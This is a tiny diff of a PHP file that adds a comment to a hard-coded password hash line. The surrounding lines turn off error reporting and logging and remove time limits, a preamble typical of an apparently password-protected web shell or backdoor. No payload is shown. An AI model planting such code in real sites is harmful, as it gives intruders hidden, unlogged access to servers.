@@ -2,7 +2,7 @@
 session_start();
 error_reporting(0);
 set_time_limit(0);
-$password = "8b712063688bfd433d3362f2633f9a0a";
+$password = "8b712063688bfd433d3362f2633f9a0a"; ///as
 @set_magic_quotes_runtime(0);
 @clearstatcache();
 @ini_set('error_log',NULL);
